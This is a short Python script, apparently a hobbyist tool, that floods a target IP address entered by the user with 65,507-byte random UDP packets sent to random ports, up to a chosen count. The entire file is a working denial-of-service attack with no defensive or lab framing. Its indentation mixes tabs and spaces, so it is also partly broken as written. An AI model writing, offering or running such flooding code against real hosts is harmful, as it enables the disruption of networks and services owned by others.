import socket, random, sys

#function to flood th target given the IP address of the target
def udp_flood(target, data_size, max_packets, socket):
	i=0
	print (f"Flooding {target} with UDP packets.")
	
	while i < max_packets:
	    #size of data to be sent in bytes 
		data=random._urandom(data_size)
		#random port number to send data (MIN and MAX port)
		port=random.randint(0, 65535)
		#send data to target
		socket.sendto(data, (target, port))
		i=i+1
		sys.stdout.write(f"Sent packer number {str(i)} to port: {port}\n")

if __name__ == "__main__":
	#ip address of the target
	target=str(input('Enter target IP:'))
    #number of packets to send
	max_packets=int(input('Enter max packets:'))
	#max size of the data to be sent in bytes
	size=65507

	try:
		#create a new socket for UDP
		connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
	except socket.error:
		print('Failed to create socket')
	print('Socket Created')

	#flood the target
	udp_flood(target, size, max_packets, connection)